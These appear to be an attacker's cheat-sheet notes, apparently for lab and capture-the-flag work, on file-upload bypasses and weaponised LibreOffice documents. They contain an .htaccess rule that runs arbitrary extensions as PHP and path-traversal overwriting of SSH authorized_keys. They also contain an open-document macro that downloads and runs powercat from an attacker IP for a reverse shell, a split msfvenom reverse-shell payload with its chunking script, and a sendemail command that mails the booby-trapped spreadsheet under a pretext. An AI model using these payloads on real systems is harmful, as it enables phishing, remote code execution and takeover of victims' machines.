#### HTACCESS BYPASS

```
#Upload a custom .htaccess file. (https://br4ind3ad.medium.com/port-swigger-file-upload-vulnerability-lab-4-4c2bf39eeaf)
#This means all files with the extension evil with execute as PHP.
AddType application/x-httpd-php .evil
```

### Extension 

```
#Modify the original extension
eg. phps, pHp, php7, phtml.
```


### Over Writing
![[Pasted image 20231205204847.png]]

The response shows the ../../ indicating we may be able to overwrite files.

Create a SSH key and authroized_keys file.

![[Pasted image 20231205205001.png]]

Select your file and edit the path to overwrite a folder.

![[Pasted image 20231205205011.png]]


## LibreOffice

### Method 1
#### ODT / ODS
```
Reference: https://al1z4deh.medium.com/proving-grounds-craft-c92de878e004 OR https://dominicbreuker.com/post/htb_re/

#Steps In LibreOffice (ODT) or LibreCalc (ODS)
1. Create new document.
2. Add macro: Tools -> Macros -> Organise Macros -> Basic
3. Assign Macro Open Document Event.
4. Edit new Macro.

REM  ***** BASIC *****

Sub Main
	Shell("cmd /c powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<ip>/powercat.ps1'); powercat -c <ip> -p <port> -e powershell"")
End Sub

4. Might pay to just do a curl first to test the code execution is working.

```

### Method 2 

```
#Generates ODF file which can be used to leak NTLM credentials.
https://www.exploit-db.com/exploits/44564
```


### Method 3
#### ODT / ODS

```
1. #Generate payload
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.118.8 LPORT=443 -f hta-psh -o evil.hta

2. Split payload. Using this python3 script.
s = "<payload here>"

n = 50
for i in range(0, len(s), n):
    chunk = s[i:i + n]
    print('Str = Str + "' + chunk + '"')

3. Create new macro in Libre (Refer to method 1 steps.)
4. Drop payload in it should look like something below:

Sub Exploit

   Dim Str As String

   Str = Str + "cmd.exe /C powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4Ad"
   Str = Str + "ABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewA"
   Str = Str + "AUwAyAEIAMABLAEEAQQBBAD0AJwAnACkAKQApACwAWwBTAHkAc"
   Str = Str + "wB0AGUAbQAuAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgA"
   Str = Str + "uAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgBNAG8AZABlAF0AOgA6A"
   ...
   Str = Str + "EQAZQBjAG8AbQBwAHIAZQBzAHMAKQApACkALgBSAGUAYQBkAFQ"
   Str = Str + "AbwBFAG4AZAAoACkAKQApACcAOwAkAHMALgBVAHMAZQBTAGgAZ"
   Str = Str + "QBsAGwARQB4AGUAYwB1AHQAZQA9ACQAZgBhAGwAcwBlADsAJAB"
   Str = Str + "zAC4AUgBlAGQAaQByAGUAYwB0AFMAdABhAG4AZABhAHIAZABPA"
   Str = Str + "HUAdABwAHUAdAA9ACQAdAByAHUAZQA7ACQAcwAuAFcAaQBuAGQ"
   Str = Str + "AbwB3AFMAdAB5AGwAZQA9ACcASABpAGQAZABlAG4AJwA7ACQAc"
   Str = Str + "wAuAEMAcgBlAGEAdABlAE4AbwBXAGkAbgBkAG8AdwA9ACQAdAB"
   Str = Str + "yAHUAZQA7ACQAcAA9AFsAUwB5AHMAdABlAG0ALgBEAGkAYQBnA"
   Str = Str + "G4AbwBzAHQAaQBjAHMALgBQAHIAbwBjAGUAcwBzAF0AOgA6AFM"
   Str = Str + "AdABhAHIAdAAoACQAcwApADsA"

   Shell(Str)

End Sub

5. Send payload

sendemail -f 'jonas@localhost' \
                       -t 'mailadmin@localhost' \
                       -s 192.168.120.132:25 \
                       -u 'Your spreadsheet' \
                       -m 'Here is your requested spreadsheet' \
                       -a bomb.ods

```